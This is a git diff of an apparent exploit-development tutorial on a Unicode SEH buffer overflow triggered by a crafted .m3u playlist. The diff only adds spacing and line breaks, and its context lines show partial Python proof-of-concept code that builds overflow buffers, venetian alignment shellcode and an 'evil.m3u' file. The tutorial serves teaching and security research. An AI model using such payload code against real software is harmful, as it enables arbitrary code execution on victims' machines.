@@ -249,11 +249,13 @@ Now, lets update the PoC script and confirm that we have used the right address.
 </p>
 
 ```python
+
 eip = "http://" + "A" * 301 + "BB" + "\x7a\x74" + "D" * 707
 
 f=open("eip.m3u","wb")
 f.write(eip)
 f.close()
+
 ```
 
 <p style="text-align:justify;">
@@ -280,10 +282,13 @@ Now, if we continue executing the instructions, we will land at the next SEH rec
 <p style="text-align:justify;">
 If we continue the execution, we will see that the instructions in address <b>0x0012EC6D</b> cannot be executed, and for that reason we should find a unicode compatible nop in order to skip the instructions that causing this issue and then be able to continue the execution to the large buffer we control. It is worth to mention that we cannot use a short jmp instruction to jump to the location we want when exploiting unicodes, because short jmp instructions usually need two bytes without any trailing or leading zeros in them.   
 </p>
-
+<br><br>
 ------------
+<br><br>
 
 ### Finding a Unicode compatible NOP
+
+<br><br>
 
 <p style="text-align:justify;">
 A Unicode compatible NOP or "Venetian code" is any instruction that can absorb the leading and the trailing zeros without affecting the execution flow of the program. In order to be more specific, lets observe the instructions shown at the screenshot below 
@@ -666,6 +671,7 @@ We will finalize our python PoC script as follows
 
 
 ```python
+
 align=("\x56"           # push esi
        "\x6e"           # venetian shellcode
        "\x58"           # pop eax
@@ -727,6 +733,7 @@ payload = "http://" + "A" * 301 + "\x61\x6e" + "\x7a\x74" + align + nops + buf +
 f=open("evil.m3u","wb")
 f.write(payload)
 f.close()
+
 ```
 
 <p style="text-align:justify;">
